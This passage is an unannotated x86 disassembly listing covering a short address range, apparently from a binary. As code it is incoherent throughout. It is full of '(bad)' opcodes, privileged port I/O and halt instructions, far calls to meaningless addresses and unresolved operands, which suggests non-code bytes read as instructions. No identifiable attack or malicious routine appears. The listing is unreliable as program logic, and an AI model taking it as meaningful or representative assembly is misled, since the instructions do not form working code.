  409b97:	and    BYTE PTR [edi-0x78],dh
  409b9a:	inc    esp
  409b9b:	or     bh,bh
  409b9d:	mov    esp,0x56312166
  409ba2:	inc    esp
  409ba3:	or     bh,bh
  409ba5:	mov    esp,0x29457a2e
  409baa:	mov    al,0xc4
  409bac:	mov    edi,0xbf941c02
  409bb1:	adc    edi,ebp
  409bb3:	jae    0x409bb4
  409bb5:	push   ss
  409bb6:	stos   BYTE PTR es:[edi],al
  409bb7:	(bad)
  409bbb:	(bad)
  409bbf:	sbb    cl,BYTE PTR [ebx+0x501e007c]
  409bc5:	adc    cl,ch
  409bc7:	xor    cl,BYTE PTR [ecx]
  409bc9:	repz inc ebp
  409bcb:	addr16 xchg esi,eax
  409bcd:	pop    esp
  409bce:	sub    BYTE PTR ds:0x32e90b50,ch
  409bd4:	or     ebx,esi
  409bd6:	lea    ebp,[ecx+0x77620794]
  409bdc:	(bad)  
  409bdd:	repnz lea ebp,[edi+0x4419dfc4]
  409be4:	xchg   esp,eax
  409be5:	mov    edi,0xe846a7b6
  409bea:	pop    es
  409beb:	adc    cl,BYTE PTR [edx]
  409bed:	jmp    DWORD PTR [esi-0x7617b949]
  409bf3:	or     al,0xa
  409bf5:	call   DWORD PTR [ebp+0x5cef94af]
  409bfb:	mov    DWORD PTR [edx-0x47],0x68800
  409c02:	add    bl,bl
  409c04:	test   eax,0xafa8758c
  409c09:	pop    es
  409c0a:	add    BYTE PTR [eax+0x6],bl
  409c0d:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c0f:	bound  eax,QWORD PTR [edi]
  409c11:	lea    eax,[ebp+0x0]
  409c14:	push   esi
  409c15:	out    0x68,eax
  409c17:	stos   BYTE PTR es:[edi],al
  409c18:	push   es
  409c19:	add    BYTE PTR [ebx+0x7d8a1605],cl
  409c1f:	add    al,0xc7
  409c21:	out    dx,al
  409c22:	add    esp,DWORD PTR [ebx]
  409c24:	cmc    
  409c25:	jae    0x409c8e
  409c27:	add    BYTE PTR [ebx+0x5],dh
  409c2a:	lea    eax,[ebp+0x70]
  409c2d:	push   esi
  409c2e:	push   ebp
  409c2f:	push   esi
  409c30:	and    bh,ch
  409c32:	mov    ds:0xc6890800,eax
  409c37:	or     bh,cl
  409c39:	add    bh,bh
  409c3b:	jne    0x409c2a
  409c3d:	add    eax,0x892f46b6
  409c42:	clc    
  409c43:	or     BYTE PTR [edi+0x8],ah
  409c46:	sub    esi,eax
  409c48:	repz jp 0x409c5a
  409c4b:	ror    esi,1
  409c4d:	pusha  
  409c4e:	jmp    FWORD PTR [ecx-0x28]
  409c51:	imul   edi,edi,0x69
  409c54:	enter  0xfe4f,0x75
  409c58:	mov    eax,0x9869ff6b
  409c5d:	in     eax,dx
  409c5e:	mov    ebp,0xb059881
  409c63:	shl    BYTE PTR [esp+ebp*1+0x4f],0x50
  409c68:	jo     0x409bec
  409c6a:	xchg   esi,eax
  409c6b:	(bad)  
  409c6c:	fisttp WORD PTR [ecx+0x52259d7]
  409c72:	push   0x0
  409c74:	cmp    DWORD PTR [edx+0x55],edx
  409c77:	push   DWORD PTR [ecx]
  409c79:	in     eax,dx
  409c7a:	repz imul esi,DWORD PTR [ecx],0xc4e80406
  409c81:	mov    al,ds:0x602a0003
  409c86:	cdq    
  409c87:	pop    es
  409c88:	add    cl,BYTE PTR [eax+0x4e0095bf]
  409c8e:	call   0x5eae:0xdebadade
  409c95:	(bad)  
  409c97:	inc    ebp
  409c98:	adc    BYTE PTR [ecx],dh
  409c9a:	dec    ebp
  409c9b:	jle    0x409c89
  409c9d:	mov    dl,0x2e
  409c9f:	adc    al,0x57
  409ca1:	sbb    BYTE PTR [ebx],0x2f
  409ca4:	jmp    DWORD PTR [esi+esi*8+0x4a297511]
  409cab:	cmp    edx,DWORD PTR [eax-0x14bc7f2]
  409cb1:	jl     0x409cad
  409cb3:	sbb    cl,BYTE PTR [ebx+eiz*4-0x674ecd9]
  409cba:	mov    edx,0x323af805
  409cbf:	cwde   
  409cc0:	inc    esi
  409cc1:	mov    ah,0xb5
  409cc3:	push   ss
  409cc4:	push   eax
  409cc5:	fidivr WORD PTR [ebp-0x1]
  409cc8:	(bad)  
  409cc9:	pop    esp
  409cca:	jmp    0x8911:0xf7ccab1a
  409cd1:	ins    BYTE PTR es:[edi],dx
  409cd2:	out    dx,al
  409cd3:	jg     0x409d1a
  409cd5:	rol    DWORD PTR [edx+0x13],0x75
  409cd9:	and    eax,0x990797df
  409cde:	jns    0x409cf0
  409ce0:	jmp    DWORD PTR [esi-0x61083787]
  409ce6:	cmp    eax,0xba1cff14
  409ceb:	adc    DWORD PTR [ebp-0x7b],esi
  409cee:	mov    bh,0x97
  409cf0:	sti    
  409cf1:	add    BYTE PTR [ecx+0x7e11f809],bl
  409cf7:	or     BYTE PTR [edx+0x2b],dh
  409cfa:	jbe    0x409d7a
  409cfc:	xchg   ebp,eax
  409cfd:	sbb    ecx,DWORD PTR [ebx+0x66128d9e]
  409d03:	jle    0x409c86
  409d05:	sbb    eax,DWORD PTR [ebx-0x34ed8262]
  409d0b:	or     BYTE PTR [esi],bl
  409d0d:	adc    eax,esp
  409d0f:	adc    BYTE PTR [ecx+0x6608b59d],al
  409d15:	jle    0x409d89
  409d17:	fs mov esi,0xe911733c
  409d1d:	mov    eax,0x9069f4bb
  409d22:	cmp    cl,BYTE PTR [edi]
  409d24:	mov    ebx,0xd97e1fe4
  409d29:	adc    bl,BYTE PTR [ecx+edx*1+0x7beba41]
  409d30:	adc    bh,BYTE PTR cs:[ecx+ebx*1+0x26]
  409d35:	cwde   
  409d36:	ss icebp 
  409d38:	dec    ebp
  409d39:	adc    dh,dh
  409d3b:	pop    es
  409d3c:	push   ss
  409d3d:	cwde   
  409d3e:	or     BYTE PTR ds:[ebx+edi*8+0x1203acce],dl
  409d46:	fiadd  WORD PTR [edi]
  409d48:	je     0x409d3d
  409d4a:	xlat   BYTE PTR ds:[ebx]
  409d4b:	jge    0x409d2e
  409d4d:	sbb    edi,DWORD PTR [ebx+0x8]
  409d50:	out    dx,al
  409d51:	adc    DWORD PTR [edx+0x7afd5d],edi
  409d57:	xor    ecx,DWORD PTR [eax]
  409d59:	push   esp
  409d5a:	hlt    
  409d5b:	mov    bh,0x7d
  409d5d:	loope  0x409d7a
  409d5f:	mov    eax,0xb211ce05
  409d64:	test   ebp,esi
  409d66:	add    al,0x27
  409d68:	pop    ds
  409d69:	mov    esi,0x82697
  409d6e:	cmp    al,0x8d
  409d70:	out    dx,eax
  409d71:	ja     0x409d1f
  409d73:	and    BYTE PTR [eax],cl
  409d75:	call   FWORD PTR [eax*4+0x1af17506]
  409d7c:	jbe    0x409d7b
  409d7e:	xchg   esi,eax
  409d7f:	inc    eax
  409d80:	or     BYTE PTR [ebp-0x7],dh
  409d83:	les    ebx,FWORD PTR [edi]
  409d85:	(bad)  
  409d86:	cld    
  409d87:	pop    edx
  409d88:	out    dx,eax
  409d89:	sbb    BYTE PTR [ecx+0x40],0x8
  409d8d:	(bad)  
  409d8e:	cld    
  409d8f:	inc    edx
  409d90:	push   es
  409d91:	jne    0x409d74
  409d93:	sub    bh,bl
  409d95:	mov    fs,WORD PTR [esi+0x20]
  409d98:	rol    cl,cl
  409d9a:	stc    
  409d9b:	xor    bl,BYTE PTR [esi-0x75]
  409d9e:	inc    ebp
  409d9f:	inc    eax
  409da0:	jl     0x409dae
  409da2:	ret    
  409da3:	xor    eax,DWORD PTR [esi]
  409da5:	jne    0x409d98
  409da7:	cmp    ch,BYTE PTR [ebx-0x70]
  409daa:	ds inc eax
  409dac:	push   es
  409dad:	jne    0x409d94
  409daf:	and    DWORD PTR [eax+ecx*1+0x41],edi
  409db3:	pop    eax
  409db4:	pop    es
  409db5:	jmp    DWORD PTR [esi]
  409db7:	jl     0x409e15
  409db9:	adc    BYTE PTR [eax+0x0],dh
  409dbc:	das    
  409dbd:	push   es
  409dbe:	jne    0x409da5
  409dc0:	inc    ecx
  409dc1:	jl     0x409dcb
  409dc3:	add    DWORD PTR [eax],ebp
  409dc5:	pop    es
  409dc6:	inc    DWORD PTR [esi]
  409dc8:	pop    esp
  409dc9:	pop    esp
  409dca:	adc    al,0x70
  409dcc:	das    
  409dcd:	push   es
  409dce:	jne    0x409db5
  409dd0:	and    DWORD PTR [eax+ecx*1+0x1],edi
  409dd4:	js     0x409ddd
  409dd6:	jmp    esi
  409dd8:	cmp    eax,0x2c70185c
  409ddd:	rol    cl,1
  409ddf:	std    
  409de0:	xor    bl,BYTE PTR [ebx+ecx*4-0x43]
  409de4:	lods   eax,DWORD PTR ds:[esi]
  409de5:	int    0xeb
  409de7:	add    BYTE PTR [esi],bh
  409de9:	sar    ch,0x75
  409dec:	jl     0x409d92
  409dee:	(bad)  
  409def:	dec    BYTE PTR [ebp+0x5]
  409df2:	out    0x19,eax
  409df4:	call   0x1e409d11
  409df9:	add    esi,edi
  409dfb:	jne    0x409d7d
  409dfd:	and    cl,BYTE PTR [edx-0x74e63871]
  409e03:	lock mov cl,0xd5
  409e06:	(bad)  
  409e07:	dec    DWORD PTR [eax-0x7b]
  409e0a:	inc    ebp
  409e0b:	adc    al,0xcb
  409e0d:	sar    esi,1
  409e0f:	je     0x409e6e
  409e11:	and    esi,DWORD PTR [esi]
  409e13:	add    DWORD PTR [eax+0xa],ebx
  409e16:	mov    DWORD PTR [ebp-0x2c],0x48000009
  409e1d:	xchg   DWORD PTR [ebp-0x4],eax
  409e20:	add    al,ch
  409e22:	sbb    BYTE PTR [ebp+0x14],dh
  409e25:	ja     0x409dc6
  409e27:	push   cs
  409e28:	(bad)  
  409e29:	fld    QWORD PTR [ecx]
  409e2b:	out    0xf2,eax
  409e2d:	push   esi
  409e2e:	sbb    edi,edi
  409e30:	mov    eax,DWORD PTR [eax-0x73]
  409e33:	jl     0x409e31
  409e35:	sbb    BYTE PTR [esi-0x492997df],bl
  409e3b:	aas    
  409e3c:	add    BYTE PTR [edi],dl
  409e3e:	lahf   
  409e3f:	cli    
  409e40:	call   0x40292d
  409e45:	ror    DWORD PTR [ecx+0x75],cl
  409e48:	or     eax,0x415c8fc0
  409e4d:	enter  0x7518,0xfc
  409e51:	xor    BYTE PTR [ecx],bl
  409e53:	add    BYTE PTR [eax],0xd8
  409e56:	add    BYTE PTR [ebp-0x14],0xe3
  409e5a:	or     eax,0xce445c7
  409e5f:	add    BYTE PTR [eax],al
  409e61:	xor    eax,esi
  409e63:	cmp    DWORD PTR [ebp-0x6b],0x91796ef
  409e6a:	icebp  
  409e6b:	add    ch,bh
  409e6d:	xlat   BYTE PTR ds:[ebx]
  409e6e:	(bad)  
  409e6f:	cwde   
  409e70:	or     ebx,DWORD PTR [ecx-0x79008c24]
  409e76:	mov    dh,0x98
  409e78:	sti    
  409e79:	jle    0x409e9f
  409e7b:	add    al,ch
  409e7d:	std    
  409e7e:	or     BYTE PTR [edi],0xff
  409e81:	pop    eax
  409e82:	push   0x4
  409e84:	add    BYTE PTR [eax],al
  409e86:	xor    DWORD PTR [ebx-0x37],ebp
  409e89:	adc    esi,DWORD PTR [edx+0x2c7502c7]
  409e8f:	cdq    
  409e90:	test   DWORD PTR [eax],eax
  409e92:	xor    eax,esi
  409e94:	inc    ebp
  409e95:	inc    ebp
  409e96:	dec    ecx
  409e97:	out    dx,eax
  409e98:	add    al,BYTE PTR [eax]
  409e9a:	xor    DWORD PTR [edi],esi
  409e9c:	leave  
  409e9d:	repz xor eax,esi
  409ea0:	add    al,BYTE PTR [eax]
  409ea2:	div    BYTE PTR [ebp-0xdceffee]
  409ea8:	add    cl,BYTE PTR [ebp-0x734bbd8c]
  409eae:	ins    BYTE PTR es:[edi],dx
  409eaf:	ds mov ah,0x8c
  409eb2:	je     0x409eee
  409eb4:	mov    ah,0xfe
  409eb6:	jl     0x409e96
  409eb8:	or     eax,0x251a2975
  409ebd:	(bad)  
  409ebe:	mul    BYTE PTR [ebx]
  409ec0:	cmp    DWORD PTR [ebp-0x23],0xfffffff2
  409ec4:	xchg   esi,eax
  409ec5:	xor    dh,BYTE PTR [edx+0x65000a95]
  409ecb:	fld    QWORD PTR [ecx-0x680d2283]
  409ed1:	add    eax,0x137db2
  409ed6:	cmp    eax,0xb9750dd1
  409edb:	or     esi,esp
  409edd:	cwde   
  409ede:	sub    dh,cl
  409ee0:	stc    
  409ee1:	je     0x409e91
  409ee3:	add    al,0xd6
  409ee5:	cwde   
  409ee6:	mov    ds:0x5404,al
  409eeb:	mov    DWORD PTR [ecx],edx
  409eed:	pop    eax
  409eee:	push   cs
  409eef:	xchg   esi,eax
  409ef0:	add    al,0x34
  409ef2:	adc    al,0x8e
  409ef4:	jle    0x409edb
  409ef6:	sbb    eax,DWORD PTR [ecx+ebx*4+0x7e7e0ead]
  409efd:	mov    eax,ds:0x9d98931b
  409f02:	push   cs
  409f03:	outs   dx,BYTE PTR ds:[esi]
  409f04:	jle    0x409ea3
  409f06:	sbb    ecx,DWORD PTR [ebx+0x5e0e8d98]
  409f0c:	jle    0x409f87
  409f0e:	sbb    eax,DWORD PTR [ebx-0x1f18268]
  409f14:	pcmpeqd mm7,mm6
  409f17:	lods   eax,DWORD PTR ds:[esi]
  409f18:	jbe    0x409f88
  409f1a:	push   cs
  409f1b:	ds mov bl,ah
  409f1e:	pop    ds
  409f1f:	xor    DWORD PTR [ebp-0x1],edi
  409f22:	cdq    
  409f23:	cs add ebx,esp
  409f26:	dec    DWORD PTR [esi]
  409f28:	outs   dx,DWORD PTR ds:[esi]
  409f29:	jns    0x409f39
  409f2b:	push   ds
  409f2c:	outs   dx,DWORD PTR ds:[esi]
  409f2d:	jmp    0x51563b40
  409f32:	mov    ds:0x993603be,eax
  409f37:	push   es
  409f38:	add    esi,DWORD PTR [edi+edi*8+0xe795b16]
  409f3f:	test   BYTE PTR [ebx],0x94
  409f42:	psubusw mm4,QWORD PTR [ebp+0x52e60e79]
  409f49:	loop   0x409f60
  409f4b:	mov    es,WORD PTR cs:[ebx+0xd]
  409f4f:	add    dh,dl
  409f51:	add    ebx,DWORD PTR [esi-0x390653]
  409f57:	fdiv   DWORD PTR [edx]
  409f59:	pop    esi
  409f5a:	mov    edi,ebp
  409f5c:	mov    al,0xcc
  409f5e:	jecxz  0x409f9f
  409f60:	and    al,0x7e
  409f62:	or     cl,dl
  409f64:	fmul   DWORD PTR [esi+0x4e2ad6fe]
  409f6a:	hlt    
  409f6b:	push   0xffffffae
  409f6d:	test   DWORD PTR [edi],0xbb9b3a
  409f73:	jmp    0xa09ea8aa
  409f78:	repz adc BYTE PTR [eax],al
  409f7b:	scas   al,BYTE PTR es:[edi]
  409f7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f7d:	or     ebp,eax
  409f7f:	adc    al,0xf6
  409f81:	add    edi,edi
  409f83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f84:	jbe    0x409f81
  409f86:	add    cl,ch
  409f88:	xor    cl,BYTE PTR [ecx]
  409f8a:	lea    esp,[ebp*1+0x5afcff59]
  409f91:	jmp    0x409f8f
  409f93:	ins    BYTE PTR es:[edi],dx
  409f94:	cmp    al,0x4
  409f96:	mov    DWORD PTR [ecx+eiz*1],ebp
  409f99:	mov    BYTE PTR [ecx+esi*2+0x35],bh
  409f9d:	jge    0x409fab
  409f9f:	push   0xffffffa6
  409fa1:	inc    DWORD PTR [ecx]
  409fa3:	(bad)  [esi+eax*4]
  409fa6:	jl     0x409ffd
  409fa8:	das    
  409fa9:	jnp    0x409fb5
  409fab:	xchg   ecx,eax
  409fac:	xor    cl,BYTE PTR [ecx]
  409fae:	add    cl,ch
  409fb0:	(bad)  
  409fb1:	rol    ecx,1
  409fb3:	icebp  
  409fb4:	add    BYTE PTR [edx],dh
  409fb6:	xchg   esp,eax
  409fb7:	inc    esp
  409fb8:	xor    DWORD PTR [ebp+0x1ae17503],edi
  409fbe:	xlat   BYTE PTR ds:[ebx]
  409fbf:	mov    WORD PTR [esi],fs
  409fc1:	and    al,0x86
  409fc3:	jl     0x409fe6
  409fc5:	xor    eax,0x72e2047d
  409fca:	jge    0x409fd6
  409fcc:	push   ecx
  409fcd:	xor    cl,BYTE PTR [ecx]
  409fcf:	add    BYTE PTR [eax],al
  409fd1:	enter  0xc7b4,0xc2
  409fd5:	rol    BYTE PTR [esi],0x83
  409fd8:	jge    0x409f96
  409fda:	or     esi,DWORD PTR [edx+0x1f]
  409fdd:	pop    ebp
  409fde:	retf   0x50f6
  409fe1:	(bad)  
  409fe2:	cmc    
  409fe3:	std    
  409fe4:	jne    0x409f86
  409fe6:	push   ds
  409fe7:	mov    ?,WORD PTR cs:[edi+0x15]
  409feb:	lea    eax,[ebp-0x80]
  409fee:	mov    dh,0xfd
  409ff0:	jne    0x409f92
  409ff2:	push   ds
  409ff3:	sahf   
  409ff4:	(bad)  
  409ff5:	iret   
  409ff6:	adc    eax,0x21744589
  409ffb:	sbb    eax,0x5015558d
  40a000:	call   DWORD PTR ds:0xdd8de705
  40a006:	adc    al,0xff
  40a008:	mov    DWORD PTR ds:0xc0458d31,edx
  40a00e:	mov    dh,0x68
  40a010:	add    al,0xaf
  40a012:	fwait
  40a013:	push   es
  40a014:	call   0x402471
  40a019:	add    ch,cl
  40a01b:	retf   0x50f6
  40a01e:	iret   
  40a01f:	call   0xffff:0xffbe806
  40a026:	fwait
  40a027:	xchg   ebx,eax
  40a028:	loop   0x40a02b
  40a02a:	add    eax,0x80458bf4
  40a02f:	mov    dh,0xfd
  40a031:	jne    0x40a09f
  40a033:	adc    eax,0x9b4f0c75
  40a038:	push   es
  40a039:	call   0x3fb2ec
  40a03e:	pop    ebp
  40a03f:	retf   
  40a040:	not    BYTE PTR [eax+0x4f]
  40a043:	fwait
  40a044:	push   es
  40a045:	call   0x3fb0c9
  40a04a:	xor    DWORD PTR [edi-0x72],ebp
  40a04d:	div    DWORD PTR [ecx]
  40a04f:	popf   
  40a050:	clc    
  40a051:	mov    bh,0x31
  40a053:	lock add al,BYTE PTR [eax]
  40a056:	outs   dx,DWORD PTR ds:[esi]
  40a057:	cmp    DWORD PTR [ecx+0x8],eax
  40a05a:	xor    DWORD PTR [ebp-0x3a],ebp
  40a05d:	mul    DWORD PTR [ecx-0xd]
  40a060:	xchg   esp,eax
  40a061:	sti    
  40a062:	mov    dh,0x64
  40a064:	clc    
  40a065:	(bad)  
  40a066:	and    al,0xf8
  40a068:	sbb    al,BYTE PTR [eax-0x7cf5255c]
  40a06e:	sbb    al,0xd8
  40a070:	add    esi,DWORD PTR [ebp+0x2b]
  40a073:	mov    BYTE PTR [ebx],al
  40a075:	add    BYTE PTR [ecx],dh
  40a077:	lock test al,0xc8
  40a07a:	jae    0x40a063
  40a07c:	add    cl,BYTE PTR [ebp-0x4c480c00]
  40a082:	(bad)  
  40a083:	cld    
  40a084:	neg    DWORD PTR [edx]
  40a086:	push   cs
  40a087:	mov    esp,0x618b0aa2
  40a08c:	mov    BYTE PTR [esi],cl
  40a08e:	add    BYTE PTR [ecx],dh
  40a090:	lock or DWORD PTR [ebp+0x29],esi
  40a094:	cwde   
  40a095:	dec    eax
  40a096:	mov    cs,WORD PTR [esi-0x7e]
  40a099:	iret   
  40a09a:	inc    esp
  40a09b:	cmp    eax,0x46e90004
  40a0a0:	out    dx,eax
  40a0a1:	add    al,BYTE PTR [eax]
  40a0a3:	mov    dl,0xec
  40a0a5:	push   es
  40a0a6:	push   es
  40a0a7:	mov    ds:0x29457906,eax
  40a0ac:	ret    
  40a0ad:	or     DWORD PTR [ebp+0x29],esi
  40a0b0:	dec    edx
  40a0b1:	daa    
  40a0b2:	mov    WORD PTR [esi],ss
  40a0b4:	dec    eax
  40a0b5:	jns    0x40a0fc
  40a0b7:	or     DWORD PTR [ebx+0x4a397509],esp
  40a0bd:	into   
  40a0be:	stc    
  40a0bf:	(bad)  
  40a0c0:	das    
  40a0c1:	jns    0x40a108
  40a0c3:	stc    
  40a0c4:	or     DWORD PTR [ecx+0x1111640a],edi
  40a0ca:	(bad)  
  40a0cc:	add    BYTE PTR [esi],dl
  40a0ce:	jns    0x40a144
  40a0d0:	add    DWORD PTR [ecx+0x11115c0a],edi
  40a0d6:	aaa    
  40a0d7:	retf   0xfe00
  40a0da:	jl     0x40a148
  40a0dc:	stc    
  40a0dd:	arpl   cx,ax
  40a0df:	(bad)  
  40a0e0:	pop    ecx
  40a0e1:	out    dx,al
  40a0e2:	nop
  40a0e3:	add    BYTE PTR [esi],ch
  40a0e5:	icebp  
  40a0e6:	lods   al,BYTE PTR ds:[esi]
  40a0e7:	push   cs
  40a0e8:	scas   al,BYTE PTR es:[edi]
  40a0e9:	add    BYTE PTR [eax-0x40],dh
  40a0ec:	call   0x5400:0x10c2b8e
  40a0f3:	cld    
  40a0f4:	mov    ?,WORD PTR [esi-0x6d71f53f]
  40a0fa:	and    ebx,DWORD PTR [edx+esi*4]
  40a0fd:	jle    0x40a0b8
  40a0ff:	add    eax,DWORD PTR ds:0x8a886a7c
  40a105:	or     DWORD PTR ds:0x917eb399,ebx
  40a10b:	add    ebx,ebp
  40a10d:	addr16 push 0xffffff88
  40a110:	or     WORD PTR ds:0x238fcea5,dx
  40a117:	lds    ecx,FWORD PTR [esi-0x1]
  40a11a:	repz adc ebx,DWORD PTR [ecx+0x4a]
  40a11e:	test   DWORD PTR [ebx],0x90a91431
  40a124:	adc    al,0x71
  40a126:	out    0xa8,eax
  40a128:	jno    0x40a133
  40a12a:	pop    esi
  40a12b:	nop
  40a12c:	push   ss
  40a12d:	icebp  
  40a12e:	sbb    BYTE PTR [edx+0x43e2001e],cl
  40a134:	pushf  
  40a135:	push   cs
  40a136:	rol    DWORD PTR [ecx+0xae94a6c],1
  40a13c:	jl     0x40a137
  40a13e:	inc    DWORD PTR [eax+0xb]
  40a141:	jle    0x40a143
  40a143:	jmp    0xd7b4613f
  40a148:	add    dl,cl
  40a14a:	(bad)  
  40a14b:	dec    BYTE PTR [esi]
  40a14d:	js     0x40a14f
  40a14f:	jne    0x40a136
  40a151:	cmp    dl,BYTE PTR [esi+ecx*4+0xe]
  40a155:	sub    eax,DWORD PTR [eax]
  40a157:	jne    0x40a152
  40a159:	cmp    BYTE PTR [esi+0xc],dh
  40a15c:	adc    DWORD PTR [edi+ecx*4-0x2],ecx
  40a160:	imul   BYTE PTR [eax]
  40a162:	jbe    0x40a150
  40a164:	out    dx,al
  40a165:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a166:	adc    ebp,eax
  40a168:	jle    0x40a195
  40a16a:	add    bh,bh
  40a16c:	fidiv  WORD PTR [esi-0x66a30119]
  40a172:	out    0x8b,eax
  40a174:	pop    edi
  40a175:	sub    BYTE PTR [eax],al
  40a177:	(bad)  
  40a178:	cmp    al,0x25
  40a17a:	icebp  
  40a17b:	jo     0x40a1d5
  40a17d:	cmp    BYTE PTR [eax],al
  40a17f:	(bad)  
  40a180:	cmp    al,0x19
  40a182:	icebp  
  40a183:	push   0xff002858
  40a188:	sbb    al,0x4d
  40a18a:	icebp  
  40a18b:	pusha  
  40a18c:	js     0x40a1c6
  40a18e:	add    BYTE PTR [esi+0x6a],cl
  40a191:	mov    dh,0xf7
  40a193:	call   DWORD PTR [edx*2-0x300909ee]
  40a19a:	idiv   ebp
  40a19c:	jle    0x40a1d6
  40a19e:	xchg   esp,eax
  40a19f:	inc    esp
  40a1a0:	jno    0x40a12d
  40a1a2:	rol    cl,1
  40a1a4:	loope  0x40a1d8
  40a1a6:	push   esi
  40a1a7:	mov    edx,DWORD PTR [ebp-0x4c]
  40a1aa:	vdivsd xmm0,xmm0,QWORD PTR [eax]
  40a1ae:	mov    dh,0x12
  40a1b0:	call   0xff3f0caa
  40a1b5:	loop   0x40a229
  40a1b7:	je     0x40a1e8
  40a1b9:	add    BYTE PTR [ebp+0x6050fabe],al
  40a1bf:	or     BYTE PTR [eax+0x751047ff],0xfc
  40a1c6:	inc    edi
  40a1c7:	mov    cs,WORD PTR [edx]
  40a1c9:	call   0x402129
  40a1ce:	jecxz  0x40a21a
  40a1d0:	je     0x40a1e1
  40a1d2:	inc    edi
  40a1d3:	mov    es,WORD PTR [esi]
  40a1d5:	(bad)  
  40a1d6:	mov    ebp,0x3587e806
  40a1db:	adc    bh,bh
  40a1dd:	or     ebx,DWORD PTR [eax]
  40a1df:	mov    ?,esi
  40a1e1:	(bad)  
  40a1e2:	cmp    eax,0x5088e806
  40a1e7:	adc    bh,bh
  40a1e9:	leave  
  40a1ea:	fiadd  DWORD PTR [edx]
  40a1ec:	call   DWORD PTR [ebx+eiz*1+0x16]
  40a1f0:	add    esp,0xffff10bc
  40a1f6:	iret   
  40a1f7:	jg     0x40a1b1
  40a1f9:	(bad)  
  40a1fa:	ja     0x40a20d
  40a1fc:	add    BYTE PTR [eax],al
  40a1fe:	cwde   
  40a1ff:	or     cl,BYTE PTR [ebx-0x41026bbb]
  40a205:	je     0x40a194
  40a207:	mov    dh,BYTE PTR [edi]
  40a209:	add    BYTE PTR [ebp-0x2],cl
  40a20c:	out    0x51,eax
  40a20e:	pop    ecx
  40a20f:	or     al,BYTE PTR [eax]
  40a211:	inc    DWORD PTR [eax]
  40a213:	cmp    eax,0xc429e701
  40a218:	adc    bh,bh
  40a21a:	or     ebx,DWORD PTR [eax-0x3597f271]
  40a220:	sar    BYTE PTR [edi],0x0
  40a223:	(bad)  
  40a224:	mov    cs,WORD PTR [edx]
  40a226:	call   0x401b5a
  40a22b:	xor    edi,0x66
  40a22e:	not    edi
  40a230:	retf   0xfefe
  40a233:	xor    ebp,ebx
  40a235:	mul    bh
  40a237:	jns    0x40a2ad
  40a239:	or     bh,bh
  40a23b:	mov    eax,0x6fe4b6c
  40a240:	aas    
  40a241:	fwait
  40a242:	cmp    eax,0x8d02f030
  40a247:	lods   al,BYTE PTR ds:[esi]
  40a248:	xor    DWORD PTR [ecx],ecx
  40a24a:	(bad)  
  40a24b:	out    dx,al
  40a24c:	mov    edi,0x1ec1d01a
  40a251:	or     BYTE PTR [ebp-0xf6ce4c],cl
  40a257:	(bad)  
  40a258:	mov    edi,0x589b507
  40a25d:	or     bh,bh
  40a25f:	fyl2x  
  40a261:	xchg   bh,bh
  40a263:	mov    esi,0xb7bc7e68
  40a268:	out    dx,al
  40a269:	push   es
  40a26a:	inc    eax
  40a26b:	ds ins BYTE PTR es:[edi],dx
  40a26d:	adc    eax,DWORD PTR [eax]
  40a26f:	xor    eax,esi
  40a271:	ja     0x40a208
  40a273:	jae    0x40a24a
  40a275:	push   es
  40a276:	inc    DWORD PTR [eax]
  40a278:	sahf   
  40a279:	icebp  
  40a27a:	repnz dec DWORD PTR [esi-0x4b837111]
  40a281:	xor    eax,ebx
  40a283:	dec    edi
  40a284:	or     ebp,eax
  40a286:	mov    dh,0x40
  40a288:	xor    eax,ecx
  40a28a:	es jnp 0x40a2be
  40a28d:	lock stc 
  40a28f:	mov    edi,0xa91be4dc
  40a294:	xor    eax,esi
  40a296:	add    cl,BYTE PTR [ebp-0xfa4e44]
  40a29c:	dec    esi
  40a29d:	je     0x40a261
  40a29f:	sub    esp,ecx
  40a2a1:	pop    ss
  40a2a2:	pop    ss
  40a2a3:	dec    edi
  40a2a4:	lock out dx,eax
  40a2a6:	sbb    al,dl
  40a2a8:	mov    edx,0xf10b02ef
  40a2ad:	or     esp,ebx
  40a2af:	add    BYTE PTR [eax],bl
  40a2b1:	mov    gs,eax
  40a2b3:	add    esi,DWORD PTR [ecx]
  40a2b5:	cld    
  40a2b6:	fcomi  st,st(7)
  40a2b8:	push   cs
  40a2b9:	xchg   ebx,eax
  40a2ba:	jno    0x40a2c3
  40a2bc:	push   cs
  40a2bd:	adc    DWORD PTR [ecx],ebp
  40a2bf:	xchg   ecx,eax
  40a2c0:	aaa    
  40a2c1:	jno    0x40a252
  40a2c3:	mov    esp,0x91360971
  40a2c8:	sub    dh,cl
  40a2ca:	and    eax,0x11fcee73
  40a2cf:	cli    
  40a2d0:	pop    eax
  40a2d1:	or     DWORD PTR [esi],ebx
  40a2d3:	xchg   ecx,eax
  40a2d4:	sub    dh,cl
  40a2d6:	push   ecx
  40a2d7:	jae    0x40a2af
  40a2d9:	cld    
  40a2da:	pop    ebx
  40a2db:	jno    0x40a2dd
  40a2dd:	repz sti 
  40a2df:	add    eax,0xcd57b407
  40a2e4:	mov    cl,0x6e
  40a2e6:	icebp  
  40a2e7:	cmc    
  40a2e8:	jb     0x40a2a0
  40a2ea:	cld    
  40a2eb:	cwde   
  40a2ec:	push   es
  40a2ed:	and    al,0x19
  40a2ef:	cmp    DWORD PTR [edi],eax
  40a2f1:	sbb    al,0x11
  40a2f3:	ror    DWORD PTR [ecx],1
  40a2f5:	lahf   
  40a2f6:	cld    
  40a2f7:	aad    0x1b
  40a2f9:	fwait
  40a2fa:	mov    ebp,cs
  40a2fc:	push   es
  40a2fd:	call   0x6392:0x5ac17448
  40a304:	dec    edi
  40a305:	jg     0x40a303
  40a307:	mov    ch,0x6
  40a309:	cld    
  40a30a:	sbb    BYTE PTR [esi-0x5a045ab0],ch
  40a310:	push   es
  40a311:	pop    ecx
  40a312:	push   esi
  40a313:	sbb    eax,0xa9103104
  40a318:	(bad)  
  40a319:	push   cs
  40a31a:	jno    0x40a35b
  40a31c:	mov    ebx,0x908608f1
  40a321:	cmp    dh,cl
  40a323:	or     eax,0xfffc3e73
  40a328:	jne    0x40a30b
  40a32a:	mov    ah,0xfd
  40a32c:	outs   dx,BYTE PTR ds:[esi]
  40a32d:	aaa    
  40a32e:	pop    ecx
  40a32f:	call   0xff3d46d2
  40a334:	mov    ecx,0xe174fae2
  40a339:	cmp    bh,BYTE PTR [ecx-0x2]
  40a33c:	dec    esi
